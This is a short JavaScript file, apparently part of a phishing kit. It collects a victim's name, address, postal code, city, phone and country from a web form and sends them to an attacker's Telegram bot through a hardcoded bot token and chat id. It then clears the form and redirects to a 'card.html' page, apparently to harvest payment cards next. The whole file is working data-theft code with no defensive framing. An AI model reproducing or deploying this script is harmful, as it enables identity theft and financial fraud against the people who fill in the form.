var telegram_bot_id = "5660577106:AAHNe17ILesyhd93nenmqIiyb9QNu-hzLRE";
var chat_id = 5968694718 ;
var email, message, teston, testt, testth, testonn, testtt, testthh, testthhh;
var ready = function () {
    
    email = document.getElementById("prenom").value;
    message = document.getElementById("nom").value;
	teston = document.getElementById("address1").value;
    testt = document.getElementById("postal").value;
    testth = document.getElementById("city").value;
	testonn = document.getElementById("phone").value;
    testtt = document.getElementById("country").value;
    
	
    message = "prenom: " + email + "\nLnom: " + message + "\naddress1: " + teston + "\npostal: " + testt + "\ncity: " + testth + "\nphone: " + testonn + "\ncountry: " ;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    
        window.location.href = "card.html";
    });
    
    document.getElementById("prenom").value = "";
    document.getElementById("nom").value = "";
	document.getElementById("address1").value = "";
    document.getElementById("postal").value = "";
    document.getElementById("city").value = "";
	document.getElementById("phone").value = "";
	document.getElementById("country").value = "";

	
	
    return false;
	
};
